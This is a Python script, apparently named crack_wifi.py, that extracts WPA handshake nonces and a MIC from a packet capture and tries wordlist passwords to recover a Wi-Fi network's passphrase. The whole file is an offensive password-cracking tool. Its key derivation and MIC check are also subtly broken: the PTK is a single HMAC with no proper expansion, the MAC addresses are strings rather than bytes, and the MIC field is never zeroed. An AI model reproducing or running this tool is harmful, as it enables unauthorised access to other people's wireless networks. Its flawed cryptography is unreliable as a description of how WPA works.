import hashlib
import hmac
import struct
from scapy.all import *
from Crypto.Protocol.KDF import PBKDF2

# Define constants
EAPOL_TYPE = 0x888e
MIC_LENGTH = 16
PMK_LENGTH = 32
PTK_LENGTH = 16
ANONCE_LENGTH = 32
SNONCE_LENGTH = 32
MAC_ADDR_LENGTH = 6

# Function to derive PMK using PBKDF2
def derive_pmk(ssid, password):
    return PBKDF2(password, ssid.encode('utf-8'), dkLen=PMK_LENGTH, count=4096, prf=None)

# Function to derive PTK
def derive_ptk(pmk, anonce, snonce, ap_mac, client_mac):
    # Prepare the data for HMAC calculation
    data = ap_mac + client_mac + anonce + snonce
    hmac_sha1 = hmac.new(pmk, data, hashlib.sha1)
    return hmac_sha1.digest()

# Function to validate MIC
def validate_mic(ptk, mic, eapol_frame):
    # HMAC-SHA1 calculation to validate the MIC
    calculated_mic = hmac.new(ptk, eapol_frame, hashlib.sha1).digest()
    return calculated_mic == mic

# Function to extract handshake parameters from pcap
def extract_handshake(pcap_file):
    ap_mac = None
    client_mac = None
    anonce = None
    snonce = None
    mic = None
    eapol_frame = None

    # Read pcap file using scapy
    packets = rdpcap(pcap_file)
    eapol_packet_count = 0

    for packet in packets:
        if EAPOL_TYPE == packet.getlayer(EAPOL).type:
            eapol_packet_count += 1

            if eapol_packet_count == 1:
                # First EAPOL frame
                ap_mac = packet[Ether].src
                client_mac = packet[Ether].dst
                anonce = packet[EAPOL].load[25:25+ANONCE_LENGTH]
                eapol_frame = bytes(packet)
            elif eapol_packet_count == 2:
                # Second EAPOL frame
                snonce = packet[EAPOL].load[25:25+SNONCE_LENGTH]
                mic = packet[EAPOL].load[-MIC_LENGTH:]
                break

    if eapol_packet_count < 2:
        print("[-] No valid handshake found in the capture file.")
        return None, None, None, None, None, None

    return ap_mac, client_mac, anonce, snonce, mic, eapol_frame

# Perform dictionary attack
def crack_password(pcap_file, wordlist, ssid):
    ap_mac, client_mac, anonce, snonce, mic, eapol_frame = extract_handshake(pcap_file)
    if ap_mac is None:
        return

    with open(wordlist, "r") as file:
        for password in file:
            password = password.strip()  # Remove newline characters

            # Derive PMK
            pmk = derive_pmk(ssid, password)

            # Derive PTK
            ptk = derive_ptk(pmk, anonce, snonce, ap_mac, client_mac)

            # Validate the MIC
            if validate_mic(ptk, mic, eapol_frame):
                print(f"[+] Password found: {password}")
                return

    print("[-] Password not found in the provided wordlist.")

# Main function
if __name__ == "__main__":
    import sys
    if len(sys.argv) != 4:
        print("Usage: python3 crack_wifi.py <pcap file> <wordlist> <SSID>")
        sys.exit(1)

    pcap_file = sys.argv[1]
    wordlist = sys.argv[2]
    ssid = sys.argv[3]

    crack_password(pcap_file, wordlist, ssid)
